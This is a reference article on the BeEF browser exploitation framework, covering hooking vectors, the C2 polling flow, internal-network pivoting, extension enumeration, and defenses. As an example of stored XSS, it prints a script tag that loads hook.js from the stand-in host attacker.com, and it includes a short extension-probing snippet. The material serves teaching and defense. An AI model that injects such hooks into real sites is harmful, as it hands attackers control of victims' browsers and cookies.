BeEF — Browser Exploitation Framework

Category: Tools — Client-Side Exploitation and Reconnaissance
Project: The Browser Exploitation Framework Project (beefproject.com)
Classification: Penetration testing / red team tool
Primary Use In Security Work: Demonstrating XSS impact and browser attack surface; client-side post-exploitation research

Overview

BeEF (Browser Exploitation Framework) is an open-source penetration testing tool focused on exploiting vulnerabilities in web browsers. Once a victim's browser is "hooked" (loads a JavaScript payload called the BeEF hook), the attacker gains a command-and-control channel into the victim's browser. From the BeEF control panel, the attacker can run hundreds of modules: capture keystrokes, steal cookies, fingerprint the browser and network, probe internal network services, exploit browser plugins, scan for other network hosts, and launch social engineering attacks.

BeEF is the canonical demonstration tool for why XSS vulnerabilities are critical — it transforms a simple script injection into a persistent, rich, interactive attack platform. Understanding BeEF is important both for offensive (pentesting, red teaming) and defensive (recognizing the magnitude of XSS exposure, detecting hook scripts) purposes.

How It Works

Architecture

Component Description
BeEF Server Ruby application; runs command-and-control server; hosts hook.js
BeEF Web UI Browser-based admin panel for controlling hooked browsers
Hook (hook.js) JavaScript payload injected into victim's browser via XSS or other means
Communication Channel XMLHttpRequest (XHR) polling or WebSocket from victim to BeEF server
Modules Pre-built attack payloads (900+ modules in BeEF)

How a Browser Gets Hooked

Primary Vector: XSS Injection

If an attacker finds a stored XSS in a web application, they inject a <script> tag that loads the BeEF hook:

<!-- Injected via stored XSS in a comment, profile, or forum post -->
<script src="http://attacker.com:3000/hook.js"></script>

Every user who loads the page with the XSS payload has their browser hooked.

Other Vectors:

  • Social engineering: victim clicks a phishing link to a page hosting hook.js
  • Malvertising: attacker buys ad space, injects hook via ad code
  • Drive-by download: compromised legitimate website adds hook
  • Man-in-the-Browser: compromised browser extension injects hook
  • Local network attack: attacker on same WiFi, ARP poisoning, injects hook into HTTP traffic

The Hook Communication Channel

sequenceDiagram
    participant Victim as Victim Browser
    participant BeEF as BeEF C2 Server (attacker)
    participant BeEFUI as Attacker BeEF Web UI

    Victim->>BeEF: Load hook.js (via XSS injection)
    BeEF-->>Victim: JavaScript hook code
    Victim->>BeEF: POST /init - register hooked browser, send fingerprint data
    BeEF-->>Victim: Polling interval acknowledged

    loop Polling (every 1-5 seconds)
        Victim->>BeEF: GET /handshake - check for pending commands
        BeEF-->>Victim: Queue of modules to execute
        Victim->>Victim: Execute modules
        Victim->>BeEF: POST /results - return module output
    end

    BeEFUI->>BeEF: Issue new command (e.g., take screenshot)
    Note over Victim,BeEF: On next poll cycle, victim executes screenshot module
    Victim->>BeEF: Return screenshot data
    BeEF-->>BeEFUI: Display screenshot in admin panel

BeEF as Internal Network Pivot

This is one of BeEF's most dangerous capabilities: using the victim's browser as a proxy to reach internal network resources:

flowchart TD
    A[Attacker - external internet] -->|BeEF command| B[BeEF C2 Server]
    B -->|Hook.js poll - queued module| C[Victim Browser in Corporate Network]
    C -->|XHR request via browser| D[Internal service: 192.168.1.100:8080/admin]
    D ---->|Response| C
    C ----|Report module result| B
    B ----|Return result| A
    Note_A[Attacker now sees admin panel of internal service via victim proxy]

The victim browser can reach internal hosts because it is inside the corporate network. The attacker is reaching those hosts through the browser.

Chrome Extension Enumeration

A significant BeEF capability is enumerating the victim's installed Chrome extensions:

// BeEF module: Detect Chrome Extensions
// Method: load extension web-accessible resources; timeout differences reveal which extensions are installed

chrome_extension_ids.forEach((id) => {
  var img = new Image();
  img.onload = () => installed.push(id);
  img.onerror = () => {};
  img.src = `chrome-extension://${id}/icon.png`;
});

By attempting to load resources from known extension IDs (from a database of thousands of extension IDs), the hook determines which extensions are installed based on whether the resource loads. This reveals password managers, VPN extensions, security tools, and other sensitive extensions, which the attacker can then target specifically.

Detection And Defense

# Defense Description Layer
1 Fix XSS (root cause) HTTPOnly cookies + output encoding + CSP prevents hook injection Application security
2 Content Security Policy script-src 'self' 'nonce-...' blocks loading external hook.js CSP header
3 SubResource Integrity (SRI) <script integrity="sha256-..."> ensures script content hasn't changed Browser loading control
4 Network monitoring for C2 Detect unusual XHR polling to external domains every 1-5 seconds Network DLP / SIEM
5 HttpOnly cookies Prevents cookie theft via document.cookie by hook Cookie attributes
6 Disable JavaScript alerts and dialogs Some BeEF social engineering modules rely on alert(), confirm(), prompt() Browser policy
7 Browser DNS-over-HTTPS Limits some reconnaissance via DNS DNS layer

Detecting BeEF Hook Traffic

BeEF hook traffic has some characteristics:

  • Regular HTTP GET polling to a fixed path (often /hook.js, /beef/hook, or custom path)
  • JSON data POST back to C2 at the same base URL
  • Short, consistent polling intervals (1-5 seconds)
  • User-Agent matches browser but XHR origin is an unexpected domain
  • Network traffic to a domain not in the normal baseline

These patterns can be detected by:

  • Browser proxy logs
  • Enterprise DLP on outbound XHR
  • SIEM correlation on polling behavior
  • DNS monitoring for unexpected C2 domains

Key Takeaways

  • BeEF turns a browser XSS vulnerability into a full command-and-control platform with hundreds of attack modules.
  • A hooked browser can be used to steal keystrokes, cookies, internal network scan results, extension inventory, and screenshots.
  • The most dangerous capability is using the hooked browser as a network proxy to access internal corporate resources.
  • Extension enumeration allows an attacker to identify password managers and security tools installed on the victim's browser.
  • BeEF traffic has detectable patterns: regular XHR polling to an external domain at short intervals.
  • Defenses: fix XSS (root cause), Content Security Policy blocks hook loading, HttpOnly prevents cookie theft, network monitoring detects C2 polling.
  • BeEF is strictly a penetration testing and security research tool; deploying it against systems you do not own or have explicit authorization to test is illegal.
